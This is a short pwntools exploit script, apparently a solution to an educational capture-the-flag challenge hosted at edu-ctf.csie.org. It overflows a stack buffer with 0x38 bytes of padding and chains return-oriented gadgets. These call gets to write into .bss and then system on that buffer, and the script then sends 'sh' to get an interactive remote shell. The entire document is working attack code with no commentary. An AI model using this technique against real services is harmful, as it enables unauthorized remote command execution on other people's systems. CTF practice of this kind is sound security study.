from pwn import *

pop_rdi = 0x0000000000400733
get_plt = 0x400530
system_plt = 0x400520
bss = 0x00601070

p = b'a' * 0x38
p += p64(pop_rdi)
p += p64(bss)
p += p64(get_plt)
p += p64(pop_rdi)
p += p64(bss)
p += p64(system_plt)

r = remote('edu-ctf.csie.org', 10174)
r.sendafter(':D', p)
r.sendline('sh')
r.interactive()

